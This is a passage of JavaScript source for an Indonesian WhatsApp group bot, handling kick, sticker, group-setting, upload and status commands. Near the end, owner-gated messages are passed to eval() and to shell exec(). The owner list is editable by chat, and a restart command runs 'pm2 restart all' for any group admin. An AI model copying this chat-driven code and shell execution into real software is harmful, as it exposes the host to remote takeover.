            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            ap.sendMessage(ardian.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: ardian })
            }
  break
case 'kick':
case 'k': {
if (!isGroup) throw `Gak bisa disini`
if (!isBotAdmins) throw `Saya Blum Jadi Admin`
if (!isAdmins) throw `luh siape`
let users = ardian.mentionedJid[0] ? ardian.mentionedJid[0] : ardian.quoted ? ardian.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ap.groupParticipantsUpdate(ardian.chat, [users], 'remove').then((res) => ardian.reply(`otw kick`)).catch((err) => ardian.reply(jsonformat(err)))
}
break
case 'sticker':
 case 's':
  case 'stickergif':
   case 'sgif': {
            if (!quoted) return ardian.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
            ardian.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await ap.sendImageAsSticker(ardian.chat, media, ardian, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return ardian.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await ap.sendVideoAsSticker(ardian.chat, media, ardian, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                ardian.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
            }
            break
case 'setppbot': {
                if (!itsMeap) return ardian.reply(mess.owner)
                if (!quoted)return ardian.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (!/image/.test(mime)) return ardian.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return ardian.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await ap.downloadAndSaveMediaMessage(quoted)
                await ap.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                ardian.reply(`SUKSES✓`)
                }
                break
case 'gc':
if (!isGroup) return ardian.reply('Perintah ini hanya bisa digunakan digrup')
if (!isGroupAdmins) return ardian.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')
if (!isBotAdmins) return ardian.reply('Bot Harus menjadi admin')
if (args[0] == "s")  { ardian.reply(`SUKSES✓`)
ap.groupSettingUpdate(ardian.chat, 'announcement').then((res) => ardian.reply(jsonformat(res))).catch((err) => ardian.reply(jsonformat(err)))
 } else if (args[0] == "o")  { ardian.reply(`SUKSES✓`)
ap.groupSettingUpdate(ardian.chat, 'not_announcement').then((res) => ardian.reply(jsonformat(res))).catch((err) => ardian.reply(jsonformat(err)))
 } else {
ardian.reply(`Kirim perintah #${command} _options_\nOptions : o & s\nContoh : ${prefix+command} o`)
}
break
case 'del':
case 'd': {
                if (!ardian.quoted) throw false
                let { chat, fromMe, id, isBaileys } = ardian.quoted
                if (!isBaileys) throw 'Pesan Bukan Dari Saya'
                ap.sendMessage(ardian.chat, { delete: { remoteJid: ardian.chat, fromMe: true, id: ardian.quoted.id, participant: ardian.quoted.sender } })
            }
            break
case 'tourl': {
                ardian.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await ap.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    ardian.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    ardian.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break

case 'restart':{
 if (!isGroup) ardian.reply(`Mana bisa di sini tolol`)
if (!isGroupAdmins) return ardian.reply(`Hanya Bisa Di Gunakan Oleh Admin`)
        txts = `Sukses✓`
        ardian.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'rules':
textrules = `
╔══》 𝙍𝙐𝙇𝙀𝙎
╠➥ 𝐍𝐎 𝐒𝐏𝐀𝐌 𝐁𝐎𝐓
╠➥ 𝐍𝐎 𝐓𝐄𝐋𝐏𝐎𝐍 𝐁𝐎𝐓
╠➥ 𝐉𝐄𝐃𝐀 𝐌𝐈𝐍𝐈𝐌𝐀𝐋 𝟓 𝐌𝐄??𝐈𝐓
╚═════════════════
`
ardian.reply(textrules)
break
case 'ping': case 'botstatus': case 'statusbot': case 'test': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                ardian.reply(respon)
            }
            break
case 'runtime':
case 'info': {
let timestamp = speed()
                let latensi = speed() - timestamp
            	let lowq = `Bot Sudah Aktif Selama:\n⏱️ : ${runtime(process.uptime())}
🕓 : ${wita} WITA
🚀 : ${latensi.toFixed(4)} _Second_
🗳️ : ${os.hostname()}
💻 : ${os.platform()}
🗓️ : ${tanggal} M`
                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
                await ap.sendButtonText(ardian.chat, buttons, lowq, global.author, ardian, {quoted: ardian})
            	}
            break
// ADD/DEL AKSES //
case 'delakses':
case 'del':
    if (!isGroup) return ardian.reply(`wajib dalam grup`)
if (!itsMeap) return ardian.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return ardian.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
ardian.reply(`Nomor ${ya} Sudah Di Hapus`)
break
case 'addakses':
case 'add':
 if (!isGroup) return ardian.reply(`wajib dalam grup`)
if (!itsMeap) return ardian.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return ardian.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ap.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
ardian.reply(`Nomor ${bnnd} Sudah Di tambahkan!!!`)
break

case 'p':{
return ardian.reply('Apa....Minimal Salam Lah😑')
}
break
default:
if ((budy) && ["assalamu'alaikum", "Assalamu'alaikum", "Assalamualaikum", "assalamualaikum", "Assalammualaikum", "assalammualaikum", "Asalamualaikum", "asalamualaikum", "Asalamu'alaikum", " asalamu'alaikum"].includes(budy) && !isCmd) {
ap.sendMessage(from, { text: `${pickRandom(["Wa'alaikumussalam","Wa'alaikumussalam Wb.","Wa'alaikumussalam Wr. Wb.","Wa'alaikumussalam Warahmatullahi Wabarakatuh"])}`})
}
}
if (budy.startsWith('=>')) {
if (!itsMeap) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return ardian.reply(bang)
}
try {
ardian.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
ardian.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMeap) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ardian.reply(evaled)
} catch (err) {
ardian.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMeap) return
try {
return ardian.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMeap) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return ardian.reply(`${err}`)
if (stdout) {
ardian.reply(stdout)
}
})
}
} catch (err) {
ardian.reply(util.format(err))
}
} 
